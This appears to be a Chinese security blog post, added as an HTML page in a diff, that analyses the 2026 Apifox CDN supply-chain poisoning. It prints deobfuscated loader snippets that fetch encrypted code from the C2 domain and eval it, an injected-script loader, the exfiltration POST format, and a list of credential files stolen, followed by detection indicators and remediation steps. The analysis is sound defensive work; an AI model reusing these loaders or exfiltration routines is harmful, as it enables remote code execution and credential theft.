@@ -1,0 +1,703 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/mad.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="i4G5d">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="参考分析文章： https:&#x2F;&#x2F;www.leavesongs.com&#x2F;PENETRATION&#x2F;apifox-supply-chain-attack-analysis.html https:&#x2F;&#x2F;rce.moe&#x2F;2026&#x2F;03&#x2F;25&#x2F;apifox-supply-chain-attack-analysis&#x2F; 代码快照 反混淆分析 事件引言： 3月apifox的供应链投毒事件影响广泛，公司内安全运营也给了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Apifox投毒分析">
+<meta property="og:url" content="https://i4g5d.github.io/2026/04/13/Apifox%E6%8A%95%E6%AF%92%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="i4G5d-Blog">
+<meta property="og:description" content="参考分析文章： https:&#x2F;&#x2F;www.leavesongs.com&#x2F;PENETRATION&#x2F;apifox-supply-chain-attack-analysis.html https:&#x2F;&#x2F;rce.moe&#x2F;2026&#x2F;03&#x2F;25&#x2F;apifox-supply-chain-attack-analysis&#x2F; 代码快照 反混淆分析 事件引言： 3月apifox的供应链投毒事件影响广泛，公司内安全运营也给了">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i4g5d.github.io/2026/04/13/Apifox%E6%8A%95%E6%AF%92%E5%88%86%E6%9E%90/image-20260413221501800.png">
+<meta property="og:image" content="https://i4g5d.github.io/2026/04/13/Apifox%E6%8A%95%E6%AF%92%E5%88%86%E6%9E%90/image-20260413221508214.png">
+<meta property="og:image" content="https://i4g5d.github.io/2026/04/13/Apifox%E6%8A%95%E6%AF%92%E5%88%86%E6%9E%90/image-20260413221912550.png">
+<meta property="og:image" content="https://i4g5d.github.io/2026/04/13/Apifox%E6%8A%95%E6%AF%92%E5%88%86%E6%9E%90/image-20260413221917979.png">
+<meta property="og:image" content="https://i4g5d.github.io/2026/04/13/Apifox%E6%8A%95%E6%AF%92%E5%88%86%E6%9E%90/image-20260413221935593.png">
+<meta property="og:image" content="https://i4g5d.github.io/2026/04/13/Apifox%E6%8A%95%E6%AF%92%E5%88%86%E6%9E%90/image-20260413221944418.png">
+<meta property="og:image" content="https://i4g5d.github.io/2026/04/13/Apifox%E6%8A%95%E6%AF%92%E5%88%86%E6%9E%90/image-20260413221949077.png">
+<meta property="og:image" content="https://i4g5d.github.io/2026/04/13/Apifox%E6%8A%95%E6%AF%92%E5%88%86%E6%9E%90/image-20260413221955725.png">
+<meta property="article:published_time" content="2026-04-13T14:11:24.000Z">
+<meta property="article:modified_time" content="2026-04-13T14:21:53.411Z">
+<meta property="article:author" content="i4G5d">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i4g5d.github.io/2026/04/13/Apifox%E6%8A%95%E6%AF%92%E5%88%86%E6%9E%90/image-20260413221501800.png">
+  
+  
+  
+  <title>Apifox投毒分析 - i4G5d-Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i4g5d.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":4},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>i4G5d</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Apifox投毒分析"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-13 22:11" pubdate>
+          2026年4月13日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          29 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Apifox投毒分析</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>参考分析文章：<br> <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/apifox-supply-chain-attack-analysis.html">https://www.leavesongs.com/PENETRATION/apifox-supply-chain-attack-analysis.html</a><br> <a target="_blank" rel="noopener" href="https://rce.moe/2026/03/25/apifox-supply-chain-attack-analysis/">https://rce.moe/2026/03/25/apifox-supply-chain-attack-analysis/</a><br> <a target="_blank" rel="noopener" href="https://web.archive.org/web/20260305051418/https://cdn.apifox.com/www/assets/js/apifox-app-event-tracking.min.js">代码快照</a><br> <a target="_blank" rel="noopener" href="https://gist.github.com/phith0n/7020c55bf241b2f3ccf5254192bd48a5">反混淆分析</a></p>
+<h3 id="事件引言："><a href="#事件引言：" class="headerlink" title="事件引言："></a>事件引言：</h3><p><img src="/2026/04/13/Apifox%E6%8A%95%E6%AF%92%E5%88%86%E6%9E%90/image-20260413221501800.png" srcset="/img/loading.gif" lazyload><br> 3月apifox的供应链投毒事件影响广泛，公司内安全运营也给了情报<br> <img src="/2026/04/13/Apifox%E6%8A%95%E6%AF%92%E5%88%86%E6%9E%90/image-20260413221508214.png" srcset="/img/loading.gif" lazyload></p>
+<p> 这里尽量做一下分析和学习。</p>
+<blockquote>
+<p>Apifox用于 API 开发、测试、联调的一体化协作平台；基于<strong>Electron</strong> 框架开发<br> 而本次被投毒的文件 <code>https://cdn.apifox.com/www/assets/js/apifox-app-event-tracking.min.js</code><br> Apifox 桌面客户端在启动时会加载这个用于事件追踪的 SDK 文件</p>
+</blockquote>
+<p>简单说下来，就是投毒一个放在CDN的js文件，写入混淆的恶意代码，代码指向C2域名<code>apifox.it.com</code>，c2域名又指向<br> 下面分析一下攻击链细节👇</p>
+<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>从Wayback获取中毒阶段代码：<br> <a target="_blank" rel="noopener" href="https://web.archive.org/web/20260305051418/https://cdn.apifox.com/www/assets/js/apifox-app-event-tracking.min.js">投毒源码</a>，快照时间：2026-03-05 05:14:18<br> 文件结构为：前段为 Apifox 原有事件追踪代码，后段自 <code>_0x10e4()</code> 等符号起增加约 40KB，即合法埋点之后追加恶意载荷。<br> <img src="/2026/04/13/Apifox%E6%8A%95%E6%AF%92%E5%88%86%E6%9E%90/image-20260413221912550.png" srcset="/img/loading.gif" lazyload><br> 可以看到后面的代码分格和前面不一样，表面就是用了16进制混淆<br> <img src="/2026/04/13/Apifox%E6%8A%95%E6%AF%92%E5%88%86%E6%9E%90/image-20260413221917979.png" srcset="/img/loading.gif" lazyload><br> 用ai做一下反混淆，还原后的逻辑就是<br> 「凑齐身份 → 带自定义头请求 C2 → 解密并 <code>eval</code>」</p>
+<h3 id="身份打点"><a href="#身份打点" class="headerlink" title="身份打点"></a>身份打点</h3><ol>
+<li><strong>构造机器指纹</strong><br> 用 Electron 的 <code>require(&#39;os&#39;)</code> 和 <code>require(&#39;crypto&#39;)</code> 权限，提取硬件特征（MAC+CPU+主机+用户名）<br> 拼接并SHA-256哈希，作为唯一机器ID，写入 <code>localStorage</code> 的 <code>_rl_mc</code>（写入缓存，防止重采）<br> 目的：确认肉鸡身份</li>
+<li><strong>双重身份绑定</strong><br> 同上，不止识别机器，还识别用户<br> 检查 <code>localStorage</code> 中是否存在 <code>Apifox.common.accessToken</code>。<br> 这个token可调用 <code>api/v1/user</code>接口，获取用户 邮箱和用户名</li>
+</ol>
+<p>以上两条 各种信息，分别加密或打包或明文， 放在请求头里（<code>af_uuid/os/user/name等</code>）</p>
+<ol start="3">
+<li><strong>向C2发送请求</strong><br> 在上述加密代码中也内嵌了RSA私钥，这也用于处理C2回包<br> 向<code>https://apifox.it.com/public/apifox-event.js</code>发送带header的请求（fetch&#x2F;XMLHttpRequest）<br> <img src="/2026/04/13/Apifox%E6%8A%95%E6%AF%92%E5%88%86%E6%9E%90/image-20260413221935593.png" srcset="/img/loading.gif" lazyload><br> 随后服务器就返回加密的恶意JS，解密后直接<code>eval()</code>执行<br> 做了分块，非对称加密，填充</li>
+</ol>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> r = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-variable constant_">REMOTE_JS_URL</span>, &#123; <span class="hljs-attr">headers</span>: h &#125;);<br><span class="hljs-keyword">const</span> payload = (<span class="hljs-keyword">await</span> r.<span class="hljs-title function_">text</span>()).<span class="hljs-title function_">trim</span>();<br><span class="hljs-keyword">const</span> code = <span class="hljs-title function_">rsaDecrypt</span>(payload);<br><span class="hljs-built_in">eval</span>(code); <span class="hljs-comment">// ⚠️ 任意远程代码执行</span><br></code></pre></td></tr></table></figure>
+
+<p>上述代码是在污染的cdn中的，<code>eval()</code> 的作用是把<code>apifox-event.js</code>回显的加密的字符串，<strong>当场当作程序运行</strong>。最后加载一个随机路径脚本<br> 持久化处理：<code>try</code>&#x2F;<code>catch</code> 中出错会静默忽略；<code>finally</code> 里固定调用 <code>scheduleNext()</code>随机延迟绕过流量检测</p>
+<h3 id="C2渗透分析"><a href="#C2渗透分析" class="headerlink" title="C2渗透分析"></a>C2渗透分析</h3><p>下图所示为恶意域名的IP，且无法直接访问，说明做了Host或路径的限定</p>
+<p><img src="/2026/04/13/Apifox%E6%8A%95%E6%AF%92%E5%88%86%E6%9E%90/image-20260413221944418.png" srcset="/img/loading.gif" lazyload></p>
+<p>所以按照代码要求加上路径<code>apifox-event.js</code>和特定的请求头</p>
+<p><img src="/2026/04/13/Apifox%E6%8A%95%E6%AF%92%E5%88%86%E6%9E%90/image-20260413221949077.png" srcset="/img/loading.gif" lazyload></p>
+<p> 响应确实像是RSA密文，344字节的js；用前面代码中内嵌的私钥解密<br> 得到加载器，这段js会因为cdnjs中的<code>eval</code>函数而执行，去加载一个随机路径js（最终攻击）</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>  <span class="hljs-keyword">var</span> s = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;script&#x27;</span>);  <br>  s.<span class="hljs-property">src</span> = <span class="hljs-string">&#x27;hxxps://apifox[.]it[.]com/&lt;随机8位hex&gt;.js&#x27;</span>;  <br>  s.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123; s.<span class="hljs-property">parentNode</span> &amp;&amp; s.<span class="hljs-property">parentNode</span>.<span class="hljs-title function_">removeChild</span>(s) &#125;;<br>  <span class="hljs-variable language_">document</span>.<span class="hljs-property">head</span>.<span class="hljs-title function_">appendChild</span>(s)<br>&#125;)()<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>路径随机化，每次生成不同的文件名，绕过url检测</li>
+<li>脚本加载完毕自动删除dom标签和历史文件路径（防止取证）</li>
+<li>同时请求头还是带上肉鸡指纹<br> 这一套教科书的做法：加密防止waf&#x2F;IPS拦截，随机跳转防止攻击被取证并拦截， 随机延时防止沙箱检测</li>
+</ul>
+<h3 id="窃取信息-两轮"><a href="#窃取信息-两轮" class="headerlink" title="窃取信息(两轮)"></a>窃取信息(两轮)</h3><p>最后再跟着路径带上header发请求（模拟实际中毒中的onload）</p>
+<p><img src="/2026/04/13/Apifox%E6%8A%95%E6%AF%92%E5%88%86%E6%9E%90/image-20260413221955725.png" srcset="/img/loading.gif" lazyload><br> 最后就是明文（3400字节<code>Node.js</code>）了，可以看到这里还有中文注释，且有很重的AI味<br> 其中加密的密码，盐值等加密相关信息图中就比较明显了</p>
+<p>窃取目标：<br> <strong>全平台通用：</strong></p>
+<ul>
+<li><code>~/.ssh/</code> — 递归读取整个目录（私钥、公钥、config、known_hosts、authorized_keys）<br> <strong>macOS &#x2F; Linux 窃取：</strong></li>
+<li><code>~/.zsh_history</code> — Zsh 命令行历史（含密码、Token、内部 URL）</li>
+<li><code>~/.bash_history</code> — Bash 命令行历史</li>
+<li><code>~/.git-credentials</code> — Git 明文凭证（GitHub PAT、GitLab Token）</li>
+<li><code>ps aux</code> — 完整进程列表<br> <strong>Windows 额外窃取：</strong></li>
+<li><code>tasklist</code> — 进程列表</li>
+</ul>
+<p>这些数据通过数据外泄协议进行：<br> 原始 JSON → Gzip 压缩 → AES-256-GCM 加密 → Base64 编码 → POST 上传</p>
+<p> 最后POST到 <code>apifox.it.com/event/0/log</code></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http">POST hxxps://apifox[.]it[.]com/event/0/log<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/plain<br>af_uuid: &lt;Stage-2代码中硬编码的机器指纹&gt;<br><br><span class="hljs-attribute">Body</span><span class="hljs-punctuation">: </span>&lt;AES-256-GCM 加密数据&gt;<br></code></pre></td></tr></table></figure>
+
+<p>再次升级<br> 随后事态升级<br> 攻击者根据一轮信息做了二轮纵深升级<br> 增加到4400字节，上报到新路径<code>/event/2/log</code></p>
+<table>
+<thead>
+<tr>
+<th>新增窃取目标</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>~&#x2F;.zshrc</td>
+<td>Shell 环境变量（可能含 API Key、Vault 地址、数据库连接串）</td>
+</tr>
+<tr>
+<td>~&#x2F;.npmrc</td>
+<td>npm registry 认证 token</td>
+</tr>
+<tr>
+<td>~&#x2F;.kube&#x2F;*</td>
+<td>Kubernetes 集群配置（含 OIDC refresh token、集群 API 地址）</td>
+</tr>
+<tr>
+<td>~&#x2F;.subversion&#x2F;*</td>
+<td>SVN 凭证</td>
+</tr>
+<tr>
+<td>目录树遍历</td>
+<td>主目录、桌面、文档目录结构（深度 1-2 层），Windows 额外扫描 D:\、E:\、F:\</td>
+</tr>
+</tbody></table>
+<h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>首先，如何做到覆盖cdn，目前交无权威的说法，这也是攻击点，难以披露；个人认为要么是内部cdn的key或token泄露，要么是类似于依赖混淆，npm包被混淆，打包被污染最后导致产物污染</p>
+<p>其次，攻击者在入口js做了7层混淆，惊为天人，但也在混淆中加了硬编码和初级的aicoding后渗透信息加密传输，这种现象耐人寻味</p>
+<p>最后，我们留意到cdn的js文件中有用到<code>eval()</code>命令执行，结合 <code>scheduleNext()</code> 函数的轮询机制，就可以通过这个后面上线CS，实现更多控制（RCE）<br> 这都源自于Electron 赋予了 JS 调用 <code>child_process</code>（执行系统命令）和 <code>fs</code>（读写文件）的权限，攻击者通过 <code>eval()</code> 下发的代码几乎可以执行任何系统操作。</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs armasm">广撒网（投毒 CDN）→ 侦察（<span class="hljs-built_in">v1</span>/<span class="hljs-built_in">v2</span> 凭据采集）→ 筛选高价值目标 → 定制化精准打击                   <br>						 ↑                                  │   <br>					     └──── 每次轮询可下发不同指令 ←───────┘<br></code></pre></td></tr></table></figure>
+
+<h2 id="检测修复"><a href="#检测修复" class="headerlink" title="检测修复"></a>检测修复</h2><h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><p>先看看我们是这么做到受害检测的<br> 网络测：<br> 防火墙，代理，DNS日志中多次出现<code>api.it.com</code>，以及对<code>POST /event/0/log</code>的多次外送<br> header中多次包含<code>af_*</code>格式<br> Electron <code>localStorage</code> 中是否存在 <code>_rl_headers</code>、<code>_rl_mc</code> 键<br> 恶意文件是很难被补货到的，因为随机生成且用完即删除，所以唯一可能检测到的就是 EDR的行为检测</p>
+<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>修复方案就是更新（禁用）apifox&#x2F;启用<code>sandbox</code>沙盒模式<br> 删除所有密钥，key，token<br> 检查其他登录日志，看看有没有被登录，有没有操作历史</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Apifox投毒分析</div>
+      <div>https://i4g5d.github.io/2026/04/13/Apifox投毒分析/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>i4G5d</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年4月13日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/03/24/JNDI/" title="JNDI">
+                        <span class="hidden-mobile">JNDI</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
